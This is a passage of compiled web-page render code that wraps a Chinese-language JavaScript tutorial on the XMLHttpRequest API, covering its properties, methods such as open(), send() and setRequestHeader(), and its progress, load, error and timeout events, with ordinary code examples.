"),a("h4",{attrs:{id:"xmlhttprequest-responsetext"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-responsetext"}},[e._v("#")]),e._v(" XMLHttpRequest.responseText")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.responseText")]),e._v("属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', '/server', true);\n\nxhr.responseType = 'text';\nxhr.onload = function () {\n  if (xhr.readyState === 4 && xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\n\nxhr.send(null);\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-responsexml"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-responsexml"}},[e._v("#")]),e._v(" XMLHttpRequest.responseXML")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.responseXML")]),e._v("属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于"),a("code",[e._v("null")]),e._v("。")]),e._v(" "),a("p",[e._v("该属性生效的前提是 HTTP 回应的"),a("code",[e._v("Content-Type")]),e._v("头信息等于"),a("code",[e._v("text/xml")]),e._v("或"),a("code",[e._v("application/xml")]),e._v("。这要求在发送请求前，"),a("code",[e._v("XMLHttpRequest.responseType")]),e._v("属性要设为"),a("code",[e._v("document")]),e._v("。如果 HTTP 回应的"),a("code",[e._v("Content-Type")]),e._v("头信息不等于"),a("code",[e._v("text/xml")]),e._v("和"),a("code",[e._v("application/xml")]),e._v("，但是想从"),a("code",[e._v("responseXML")]),e._v("拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用"),a("code",[e._v("XMLHttpRequest.overrideMimeType()")]),e._v("方法，强制进行 XML 解析。")]),e._v(" "),a("p",[e._v("该属性得到的数据，是直接解析后的文档 DOM 树。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', '/server', true);\n\nxhr.responseType = 'document';\nxhr.overrideMimeType('text/xml');\n\nxhr.onload = function () {\n  if (xhr.readyState === 4 && xhr.status === 200) {\n    console.log(xhr.responseXML);\n  }\n};\n\nxhr.send(null);\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-responseurl"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-responseurl"}},[e._v("#")]),e._v(" XMLHttpRequest.responseURL")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.responseURL")]),e._v("属性是字符串，表示发送数据的服务器的网址。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://example.com/test', true);\nxhr.onload = function () {\n  // 返回 http://example.com/test\n  console.log(xhr.responseURL);\n};\nxhr.send(null);\n")])])]),a("p",[e._v("注意，这个属性的值与"),a("code",[e._v("open()")]),e._v("方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-status-xmlhttprequest-statustext"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-status-xmlhttprequest-statustext"}},[e._v("#")]),e._v(" XMLHttpRequest.status，XMLHttpRequest.statusText")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.status")]),e._v("属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为"),a("code",[e._v("0")]),e._v("。该属性只读。")]),e._v(" "),a("ul",[a("li",[e._v("200, OK，访问正常")]),e._v(" "),a("li",[e._v("301, Moved Permanently，永久移动")]),e._v(" "),a("li",[e._v("302, Moved temporarily，暂时移动")]),e._v(" "),a("li",[e._v("304, Not Modified，未修改")]),e._v(" "),a("li",[e._v("307, Temporary Redirect，暂时重定向")]),e._v(" "),a("li",[e._v("401, Unauthorized，未授权")]),e._v(" "),a("li",[e._v("403, Forbidden，禁止访问")]),e._v(" "),a("li",[e._v("404, Not Found，未发现指定网址")]),e._v(" "),a("li",[e._v("500, Internal Server Error，服务器发生错误")])]),e._v(" "),a("p",[e._v("基本上，只有2xx和304的状态码，表示服务器返回是正常状态。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if (xhr.readyState === 4) {\n  if ( (xhr.status >= 200 && xhr.status < 300)\n    || (xhr.status === 304) ) {\n    // 处理服务器的返回数据\n  } else {\n    // 出错\n  }\n}\n")])])]),a("p",[a("code",[e._v("XMLHttpRequest.statusText")]),e._v("属性返回一个字符串，表示服务器发送的状态提示。不同于"),a("code",[e._v("status")]),e._v("属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用"),a("code",[e._v("open()")]),e._v("方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-timeout-xmlhttprequesteventtarget-ontimeout"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-timeout-xmlhttprequesteventtarget-ontimeout"}},[e._v("#")]),e._v(" XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.timeout")]),e._v("属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequestEventTarget.ontimeout")]),e._v("属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。")]),e._v(" "),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nvar url = '/server';\n\nxhr.ontimeout = function () {\n  console.error('The request for ' + url + ' timed out.');\n};\n\nxhr.onload = function() {\n  if (xhr.readyState === 4) {\n    if (xhr.status === 200) {\n      // 处理服务器返回的数据\n    } else {\n      console.error(xhr.statusText);\n    }\n  }\n};\n\nxhr.open('GET', url, true);\n// 指定 10 秒钟超时\nxhr.timeout = 10 * 1000;\nxhr.send(null);\n")])])]),a("h4",{attrs:{id:"事件监听属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#事件监听属性"}},[e._v("#")]),e._v(" 事件监听属性")]),e._v(" "),a("p",[e._v("XMLHttpRequest 对象可以对以下事件指定监听函数。")]),e._v(" "),a("ul",[a("li",[e._v("XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了"),a("code",[e._v("abort()")]),e._v("方法）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.onerror：error 事件（请求失败）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数")]),e._v(" "),a("li",[e._v("XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数")])]),e._v(" "),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.onload = function() {\n var responseText = xhr.responseText;\n console.log(responseText);\n // process the response.\n};\n\nxhr.onabort = function () {\n  console.log('The request was aborted');\n};\n\nxhr.onprogress = function (event) {\n  console.log(event.loaded);\n  console.log(event.total);\n};\n\nxhr.onerror = function() {\n  console.log('There was an error!');\n};\n")])])]),a("p",[a("code",[e._v("progress")]),e._v("事件的监听函数有一个事件对象参数，该对象有三个属性："),a("code",[e._v("loaded")]),e._v("属性返回已经传输的数据量，"),a("code",[e._v("total")]),e._v("属性返回总的数据量，"),a("code",[e._v("lengthComputable")]),e._v("属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有"),a("code",[e._v("progress")]),e._v("事件的监听函数有参数，其他函数都没有参数。")]),e._v(" "),a("p",[e._v("注意，如果发生网络错误（比如服务器无法连通），"),a("code",[e._v("onerror")]),e._v("事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-withcredentials"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-withcredentials"}},[e._v("#")]),e._v(" XMLHttpRequest.withCredentials")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.withCredentials")]),e._v("属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为"),a("code",[e._v("false")]),e._v("，即向"),a("code",[e._v("example.com")]),e._v("发出跨域请求时，不会发送"),a("code",[e._v("example.com")]),e._v("设置在本机上的 Cookie（如果有的话）。")]),e._v(" "),a("p",[e._v("如果需要跨域 AJAX 请求发送 Cookie，需要"),a("code",[e._v("withCredentials")]),e._v("属性设为"),a("code",[e._v("true")]),e._v("。注意，同源的请求不需要设置这个属性。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://example.com/', true);\nxhr.withCredentials = true;\nxhr.send(null);\n")])])]),a("p",[e._v("为了让这个属性生效，服务器必须显式返回"),a("code",[e._v("Access-Control-Allow-Credentials")]),e._v("这个头信息。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Access-Control-Allow-Credentials: true\n")])])]),a("p",[a("code",[e._v("withCredentials")]),e._v("属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果"),a("code",[e._v("withCredentials")]),e._v("属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。")]),e._v(" "),a("p",[e._v("注意，脚本总是遵守同源政策，无法从"),a("code",[e._v("document.cookie")]),e._v("或者 HTTP 回应的头信息之中，读取跨域的 Cookie，"),a("code",[e._v("withCredentials")]),e._v("属性不影响这一点。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-upload"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-upload"}},[e._v("#")]),e._v(" XMLHttpRequest.upload")]),e._v(" "),a("p",[e._v("XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过"),a("code",[e._v("XMLHttpRequest.upload")]),e._v("属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。")]),e._v(" "),a("p",[e._v("假定网页上有一个"),a("code",[e._v("<progress>")]),e._v("元素。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('<progress min="0" max="100" value="0">0% complete</progress>\n')])])]),a("p",[e._v("文件上传时，对"),a("code",[e._v("upload")]),e._v("属性指定"),a("code",[e._v("progress")]),e._v("事件的监听函数，即可获得上传的进度。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("function upload(blobOrFile) {\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', '/server', true);\n  xhr.onload = function (e) {};\n\n  var progressBar = document.querySelector('progress');\n  xhr.upload.onprogress = function (e) {\n    if (e.lengthComputable) {\n      progressBar.value = (e.loaded / e.total) * 100;\n      // 兼容不支持 <progress> 元素的老式浏览器\n      progressBar.textContent = progressBar.value;\n    }\n  };\n\n  xhr.send(blobOrFile);\n}\n\nupload(new Blob(['hello world'], {type: 'text/plain'}));\n")])])]),a("h3",{attrs:{id:"xmlhttprequest-的实例方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-的实例方法"}},[e._v("#")]),e._v(" XMLHttpRequest 的实例方法")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-open"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-open"}},[e._v("#")]),e._v(" XMLHttpRequest.open()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.open()")]),e._v("方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("void open(\n   string method,\n   string url,\n   optional boolean async,\n   optional string user,\n   optional string password\n);\n")])])]),a("ul",[a("li",[a("code",[e._v("method")]),e._v("：表示 HTTP 动词方法，比如"),a("code",[e._v("GET")]),e._v("、"),a("code",[e._v("POST")]),e._v("、"),a("code",[e._v("PUT")]),e._v("、"),a("code",[e._v("DELETE")]),e._v("、"),a("code",[e._v("HEAD")]),e._v("等。")]),e._v(" "),a("li",[a("code",[e._v("url")]),e._v(": 表示请求发送目标 URL。")]),e._v(" "),a("li",[a("code",[e._v("async")]),e._v(": 布尔值，表示请求是否为异步，默认为"),a("code",[e._v("true")]),e._v("。如果设为"),a("code",[e._v("false")]),e._v("，则"),a("code",[e._v("send()")]),e._v("方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为"),a("code",[e._v("false")]),e._v("。")]),e._v(" "),a("li",[a("code",[e._v("user")]),e._v("：表示用于认证的用户名，默认为空字符串。该参数可选。")]),e._v(" "),a("li",[a("code",[e._v("password")]),e._v("：表示用于认证的密码，默认为空字符串。该参数可选。")])]),e._v(" "),a("p",[e._v("注意，如果对使用过"),a("code",[e._v("open()")]),e._v("方法的 AJAX 请求，再次使用这个方法，等同于调用"),a("code",[e._v("abort()")]),e._v("，即终止请求。")]),e._v(" "),a("p",[e._v("下面发送 POST 请求的例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('POST', encodeURI('someURL'));\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-send"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-send"}},[e._v("#")]),e._v(" XMLHttpRequest.send()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.send()")]),e._v("方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。")]),e._v(" "),a("p",[e._v("下面是 GET 请求的例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET',\n  'http://www.example.com/?id=' + encodeURIComponent(id),\n  true\n);\nxhr.send(null);\n")])])]),a("p",[e._v("上面代码中，"),a("code",[e._v("GET")]),e._v("请求的参数，作为查询字符串附加在 URL 后面。")]),e._v(" "),a("p",[e._v("下面是发送 POST 请求的例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nvar data = 'email='\n  + encodeURIComponent(email)\n  + '&password='\n  + encodeURIComponent(password);\n\nxhr.open('POST', 'http://www.example.com', true);\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send(data);\n")])])]),a("p",[e._v("注意，所有 XMLHttpRequest 的监听事件，都必须在"),a("code",[e._v("send()")]),e._v("方法调用之前设定。")]),e._v(" "),a("p",[a("code",[e._v("send")]),e._v("方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("void send();\nvoid send(ArrayBufferView data);\nvoid send(Blob data);\nvoid send(Document data);\nvoid send(String data);\nvoid send(FormData data);\n")])])]),a("p",[e._v("如果"),a("code",[e._v("send()")]),e._v("发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送"),a("code",[e._v("ArrayBufferView")]),e._v("或"),a("code",[e._v("Blob")]),e._v("对象，这使得通过 Ajax 上传文件成为可能。")]),e._v(" "),a("p",[e._v("下面是发送表单数据的例子。"),a("code",[e._v("FormData")]),e._v("对象可以用于构造表单数据。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var formData = new FormData();\n\nformData.append('username', '张三');\nformData.append('email', 'zhangsan@example.com');\nformData.append('birthDate', 1940);\n\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/register');\nxhr.send(formData);\n")])])]),a("p",[e._v("上面代码中，"),a("code",[e._v("FormData")]),e._v("对象构造了表单数据，然后使用"),a("code",[e._v("send()")]),e._v("方法发送。它的效果与发送下面的表单数据是一样的。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("<form id='registration' name='registration' action='/register'>\n  <input type='text' name='username' value='张三'>\n  <input type='email' name='email' value='zhangsan@example.com'>\n  <input type='number' name='birthDate' value='1940'>\n  <input type='submit' onclick='return sendForm(this.form);'>\n</form>\n")])])]),a("p",[e._v("下面的例子是使用"),a("code",[e._v("FormData")]),e._v("对象加工表单数据，然后再发送。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("function sendForm(form) {\n  var formData = new FormData(form);\n  formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');\n\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', form.action, true);\n  xhr.onload = function() {\n    // ...\n  };\n  xhr.send(formData);\n\n  return false;\n}\n\nvar form = document.querySelector('#registration');\nsendForm(form);\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-setrequestheader"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-setrequestheader"}},[e._v("#")]),e._v(" XMLHttpRequest.setRequestHeader()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.setRequestHeader()")]),e._v("方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在"),a("code",[e._v("open()")]),e._v("之后、"),a("code",[e._v("send()")]),e._v("之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。")]),e._v(" "),a("p",[e._v("该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Content-Length', JSON.stringify(data).length);\nxhr.send(JSON.stringify(data));\n")])])]),a("p",[e._v("上面代码首先设置头信息"),a("code",[e._v("Content-Type")]),e._v("，表示发送 JSON 格式的数据；然后设置"),a("code",[e._v("Content-Length")]),e._v("，表示数据长度；最后发送 JSON 数据。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-overridemimetype"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-overridemimetype"}},[e._v("#")]),e._v(" XMLHttpRequest.overrideMimeType()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.overrideMimeType()")]),e._v("方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是"),a("code",[e._v("text/xml")]),e._v("，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成"),a("code",[e._v("text/plain")]),e._v("，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.overrideMimeType('text/plain')\n")])])]),a("p",[e._v("注意，该方法必须在"),a("code",[e._v("send()")]),e._v("方法之前调用。")]),e._v(" "),a("p",[e._v("修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用"),a("code",[e._v("responseType")]),e._v("属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用"),a("code",[e._v("overrideMimeType()")]),e._v("方法。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.onload = function(e) {\n  var arraybuffer = xhr.response;\n  // ...\n}\nxhr.open('GET', url);\nxhr.responseType = 'arraybuffer';\nxhr.send();\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-getresponseheader"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-getresponseheader"}},[e._v("#")]),e._v(" XMLHttpRequest.getResponseHeader()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.getResponseHeader()")]),e._v("方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回"),a("code",[e._v("null")]),e._v("。该方法的参数不区分大小写。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("function getHeaderTime() {\n  console.log(this.getResponseHeader(\"Last-Modified\"));\n}\n\nvar xhr = new XMLHttpRequest();\nxhr.open('HEAD', 'yourpage.html');\nxhr.onload = getHeaderTime;\nxhr.send();\n")])])]),a("p",[e._v("如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。")]),e._v(" "),a("h4",{attrs:{id:"xmlhttprequest-getallresponseheaders"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-getallresponseheaders"}},[e._v("#")]),e._v(" XMLHttpRequest.getAllResponseHeaders()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.getAllResponseHeaders()")]),e._v("方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用"),a("code",[e._v("CRLF")]),e._v("分隔（回车+换行），如果没有收到服务器回应，该属性为"),a("code",[e._v("null")]),e._v("。如果发生网络错误，该属性为空字符串。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', 'foo.txt', true);\nxhr.send();\n\nxhr.onreadystatechange = function () {\n  if (this.readyState === 4) {\n    var headers = xhr.getAllResponseHeaders();\n  }\n}\n")])])]),a("p",[e._v("上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("date: Fri, 08 Dec 2017 21:04:30 GMT\\r\\n\ncontent-encoding: gzip\\r\\n\nx-content-type-options: nosniff\\r\\n\nserver: meinheld/0.6.1\\r\\n\nx-frame-options: DENY\\r\\n\ncontent-type: text/html; charset=utf-8\\r\\n\nconnection: keep-alive\\r\\n\nstrict-transport-security: max-age=63072000\\r\\n\nvary: Cookie, Accept-Encoding\\r\\n\ncontent-length: 6502\\r\\n\nx-xss-protection: 1; mode=block\\r\\n\n")])])]),a("p",[e._v("然后，对这个字符串进行处理。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var arr = headers.trim().split(/[\\r\\n]+/);\nvar headerMap = {};\n\narr.forEach(function (line) {\n  var parts = line.split(': ');\n  var header = parts.shift();\n  var value = parts.join(': ');\n  headerMap[header] = value;\n});\n\nheaderMap['content-length'] // \"6502\"\n")])])]),a("h4",{attrs:{id:"xmlhttprequest-abort"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-abort"}},[e._v("#")]),e._v(" XMLHttpRequest.abort()")]),e._v(" "),a("p",[a("code",[e._v("XMLHttpRequest.abort()")]),e._v("方法用来终止已经发出的 HTTP 请求。调用这个方法以后，"),a("code",[e._v("readyState")]),e._v("属性变为"),a("code",[e._v("4")]),e._v("，"),a("code",[e._v("status")]),e._v("属性变为"),a("code",[e._v("0")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://www.example.com/page.php', true);\nsetTimeout(function () {\n  if (xhr) {\n    xhr.abort();\n    xhr = null;\n  }\n}, 5000);\n")])])]),a("p",[e._v("上面代码在发出5秒之后，终止一个 AJAX 请求。")]),e._v(" "),a("h3",{attrs:{id:"xmlhttprequest-实例的事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xmlhttprequest-实例的事件"}},[e._v("#")]),e._v(" XMLHttpRequest 实例的事件")]),e._v(" "),a("h4",{attrs:{id:"readystatechange-事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#readystatechange-事件"}},[e._v("#")]),e._v(" readyStateChange 事件")]),e._v(" "),a("p",[a("code",[e._v("readyState")]),e._v("属性的值发生改变，就会触发 readyStateChange 事件。")]),e._v(" "),a("p",[e._v("我们可以通过"),a("code",[e._v("onReadyStateChange")]),e._v("属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为"),a("code",[e._v("4")]),e._v("的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。")]),e._v(" "),a("h4",{attrs:{id:"progress-事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#progress-事件"}},[e._v("#")]),e._v(" progress 事件")]),e._v(" "),a("p",[e._v("上传文件时，XMLHttpRequest 实例对象本身和实例的"),a("code",[e._v("upload")]),e._v("属性，都有一个"),a("code",[e._v("progress")]),e._v("事件，会不断返回上传的进度。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n\nfunction updateProgress (oEvent) {\n  if (oEvent.lengthComputable) {\n    var percentComplete = oEvent.loaded / oEvent.total;\n  } else {\n    console.log('无法计算进展');\n  }\n}\n\nxhr.addEventListener('progress', updateProgress);\n\nxhr.open();\n")])])]),a("h4",{attrs:{id:"load-事件、error-事件、abort-事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#load-事件、error-事件、abort-事件"}},[e._v("#")]),e._v(" load 事件、error 事件、abort 事件")]),e._v(" "),a("p",[e._v("load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var xhr = new XMLHttpRequest();\n\nxhr.addEventListener('load', transferComplete);\nxhr.addEventListener('error', transferFailed);\nxhr.addEventListener('abort', transferCanceled);\n\nxhr.open();\n\nfunction transferComplete() {\n  console.log('数据接收完毕');\n}\n\nfunction transferFailed() {\n  console.log('数据接收出错');\n}\n\nfunction transferCanceled() {\n  console.log('用户取消接收');\n}\n")])])]),a("h4",{attrs:{id:"loadend-事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#loadend-事件"}},[e._v("#")]),e._v(" loadend 事件")]),e._v(" "),a("p",[a("code",[e._v("abort")]),e._v("、"),a("code",[e._v("load")]),e._v("和"),a("code",[e._v("error")]),e._v("这三个事件，会伴随一个"),a("code",[e._v("loadend")]),e._v("事件，表示请求结束，但不知道其是否成功。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("xhr.addEventListener('loadend', loadEnd);\n\nfunction loadEnd(e) {\n  console.log('请求结束，状态未知');\n}\n")])])]),a("h4",{attrs:{id:"timeout-事件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#timeout-事件"}},[e._v("#")]),e._v(" timeout 事件")]),e._v(" "),a("p",[e._v("服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见"),a("code",[e._v("timeout")]),e._v("属性一节。")]),e._v(" "),a("h3",{attrs:{id:"navigator-sendbeacon-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-sendbeacon-2"}},[e._v("#")]),e._v(" Navigator.sendBeacon()")]),e._v(" 